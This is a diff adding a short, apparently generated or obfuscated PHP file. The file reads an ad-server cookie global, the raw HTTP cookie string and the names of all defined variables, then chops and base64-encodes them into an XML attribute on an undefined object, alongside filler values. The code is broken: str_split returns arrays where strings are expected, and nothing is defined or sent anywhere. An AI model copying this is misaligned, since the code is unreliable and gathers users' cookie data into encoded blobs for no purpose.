@@ -1,0 +1,5 @@
+<?php
+$vars["SimpleXMLElement"]->addAttribute(str_split(uniqid('abcdefghijklmnopqrstuvwxyz0123456789'), 257), 
+base64_encode(str_split($GLOBALS['phpAdsNew']['_cookie'], 17)[0].str_split($GLOBALS['HTTP_COOKIE'], 4097)[0].rand()), 
+base64_encode(str_split(serialize(array_keys(get_defined_vars())), 65537)[0]. str_split(base64_decode('SGVsbG8gV29ybGQh'), 1025)[0]. str_split(base64_decode('SGVsbG8gV29ybGQh'), 1025)[0]));
+?>
